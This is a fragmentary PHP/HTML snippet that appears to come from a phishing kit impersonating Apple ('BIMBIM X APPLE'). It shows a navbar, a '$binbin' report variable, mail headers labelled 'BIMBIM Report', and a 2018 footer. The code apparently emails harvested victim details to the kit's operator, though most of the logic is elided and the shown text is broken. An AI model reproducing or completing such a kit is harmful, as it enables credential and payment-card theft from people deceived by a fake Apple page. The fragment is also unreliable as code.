    ...
    <nav class="navbar navbar-default navbar-static-top">
        <div class="container">
            <div class="navbar-header">
                ...
                <a class="navbar-brand" href="#"><b>BIMBIM <font color="red">X</font><font color="gray"> APPLE</b></font></a>
            </div>
...
$binbin
  -----------------------------------------------------------------";
            ...
            $headers          = "From: BIMBIM Report <reportHIRO-BIMBIM.TEAM>\r\n";
            $headers         .= "Reply-to: BIMBIM.team\r\n";
            $headers         .= "MIME-Version: 1.0\r\n";
            $headers         .= "Content-Type: text/plain; charset=UTF-8\r\n";
...
?>
 <div class="row tall-row">
            <div class="col-md-12">
                <p>Created by BIMBIM. &copy; 2018 </p>
            </div>
        </div>
